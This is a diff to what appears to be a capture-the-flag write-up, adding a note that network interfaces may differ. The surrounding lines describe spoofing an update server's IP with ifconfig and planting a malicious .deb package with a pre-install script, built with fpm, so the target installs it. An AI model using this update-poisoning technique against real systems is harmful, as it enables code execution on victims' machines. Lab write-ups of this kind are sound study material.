@@ -47,7 +47,7 @@ So basically it download all file in /uploads/packages/ on the server updates.sa
 
 ![hosts](https://i.imgur.com/z8YgmDR.png)
 
-We don't have root so we cannot change the /etc/hosts file, but we can change the ip on our machine with **sudo ifconfig tap0 172.30.0.6/28**
+We don't have root so we cannot change the /etc/hosts file, but we can change the ip on our machine with **sudo ifconfig tap0 172.30.0.6/28**  ( your network interface may different)
 
 I created a deb file with **sudo fpm -s dir -t deb -n sploit --before-install lmao.sh ./** and place it in **/uploads/packages/**
 
